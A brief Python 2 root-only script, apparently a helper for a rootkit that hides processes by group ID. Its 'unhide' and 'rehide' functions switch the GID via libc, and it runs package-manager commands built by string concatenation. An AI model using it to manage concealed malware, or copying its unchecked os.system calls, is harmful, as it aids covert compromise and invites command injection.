#!/usr/bin/env python2

import os

if os.getuid() != 0:
    print("[-] not root")
    quit()

import ctypes
import sys
libc = ctypes.CDLL("libc.so.6")

def install_pkg(pkg_man, opt, pkg_name):
    os.system("/usr/bin/"+pkg_man+" "+opt+" "+pkg_name)

def rm_pkg(pkg_man, opt, pkg_name):
    os.system("/usr/bin/"+pkg_man+" "+opt+" "+pkg_name)

def update_pkg_man(pkg_man, opt):
    os.system("/usr/bin/"+pkg_man+" "+opt)

def unhide(n_gid):
    print("[+] unhiding process")
    raw_input("[!] press enter to continue")
    return libc.setgid(n_gid)

def clean(o_gid):
    print("[+] cleaning up and rehiding")
    raw_input("[!] press enter to continue")
    return libc.setgid(o_gid)

def getgid(): return libc.getgid()
def relocate(n_dir): return libc.chdir(n_dir)
def cwd(): return os.path.realpath("/proc/self/cwd")
